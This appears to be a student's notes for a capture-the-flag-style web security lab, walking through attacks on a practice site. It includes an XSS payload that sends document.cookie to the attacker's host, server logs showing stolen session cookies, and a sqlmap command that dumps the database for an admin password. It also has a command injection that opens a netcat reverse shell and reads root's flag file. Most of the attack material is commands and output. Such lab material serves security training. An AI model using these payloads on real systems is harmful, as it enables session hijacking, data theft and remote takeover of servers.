Welcome to Web Application Security Module \o/

Requirements
General
All your scripts will be tested on Kali Linux 2023.3
All your scripts should be exactly two lines long ($ wc -l file should print 2)
You must substitute the IP range for $1.
All your files should end with a new line (Why?)
The first line of all your files should be exactly #!/bin/bash.
A README.md file, at the root of the folder of the project, is mandatory
Your code should use the Betty style. It will be checked using betty-style.pl and betty-doc.pl
All your files must be executable

## task 2 flag (login/ and reset_password/)
- run your vpn file
- start ubuntu container
- you need to connect to the ubuntu sandbox, and make the request from there, edit the etc/hosts file (put the ip of the machine, and the domain: 
- start the cyber_websec0x00 container

### open another sandbox (you will have to sandbox, one to make the request an other to listen what the request produce.
python3 -m http.server -b :: 80
### command to make the request
curl -X POST "http://web0x00.hbtn/reset_password" -H "Host: 10.42.92.127" -d "email=yosri@web0x00.hbtn" 

- Use the token that you receive to gain access to the reset password, change the password, go to login, use the user (part of the email) and the newpassword.


## task 3-4 (/support)
3-xss_payload.txt
<script>fetch(`http://<ubuntu ip>/${document.cookie}`)</script>

- use the above script in the input (plain text) of the ticket, to send the malicious script as a support ticket  lol. 

┌──(kali㉿kali)-[~]
└─$ python3 -m http.server -b :: 80
Serving HTTP on :: port 80 (http://[::]:80/) ...
::ffff:10.8.0.6 - - [17/Apr/2024 05:19:24] code 404, message File not found
::ffff:10.8.0.6 - - [17/Apr/2024 05:19:24] "GET /reset_password/YDVzdvLIOuLYfuLZnBsInRGavJblcSnm HTTP/1.1" 404 -
::ffff:10.8.0.6 - - [17/Apr/2024 05:24:06] code 404, message File not found
::ffff:10.8.0.6 - - [17/Apr/2024 05:24:06] "GET /session=.eJxFyjsKgDAQBcC7vDpIbFMpHsETJLhiID92E1TEu2sjtsNcGJfok8CsNggpTE1qjsSvVG4vzK2UzPUfFK0PMDizsB92cvrQuttcTVDwC0yv0IQ42Uhfw_0AkYMj6g.Zh-VNg.MWQCtcSPJKnMjlk_qnGfkV1mkb4 HTTP/1.1" 404 -
::ffff:10.8.0.6 - - [17/Apr/2024 05:24:12] code 404, message File not found
::ffff:10.8.0.6 - - [17/Apr/2024 05:24:12] "GET /session=.eJxFyksKgCAURuG9_GMJmzoqWkIrULyR4AuvUhDtPaGBw_NxHqw2uMhQh_ZMAlvjmgKVIXvLOZXaoZbWm4J2Hgr8-3KRkbeU02lqhICzULNAYypRBxoj3g8vsSW4.Zh-VOg.8JCGXo-A0Wx1Ul5BVpaEfqRVIjU HTTP/1.1" 404 -

- run the paylod, and use the other sandbox to check for a different cookie, use that cookie in the support page to gain access and find the flag. 
- You have to put the cookie in webtools->storage-->cookie--> value



## task 5-6 
sqlmap -u "http://web0x00.hbtn/ticket?id=9" --cookie="session=.eJxFyksKgCAURuG9_GMJmzoqWkIrULyR4AuvUhDtPaGBw_NxHqw2uMhQh_ZMAlvjmgKVIXvLOZXaoZbWm4J2Hgr8-3KRkbeU02lqhICzULNAYypRBxoj3g8vsSW4.Z4BojQ.Hek5BhofOZUbW9No8AdLR5kweLw" --batch --dump

- The database will dumb a lot of info, you need to search for the adminpass. With this command your using a id parameter from a ticket that you maliciusly create.
- Go to the /admin panel to use the user and password that you casually founded lol.


exercise #8 flag - reverse shell
## sandbox
root@:/# nc -nlvp 80
Listening on 0.0.0.0 80

##paylod in admin's account
- http://web0x00.hbtn/admin
; ./nc your_ip_local 80 -e /bin/bash

Connection received on 10.42.74.137 35678
ls
__pycache__
app.py
db.sql
nc
nginx.conf
render.py
requirements.txt
static
templates
utils
web0x00.sqlite3
cd ..
ls
app
bin
boot
dev
etc
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
cd root/
ls
flag.txt
cat flag.txt
3845211fd4640c1d07072f4609500f0e
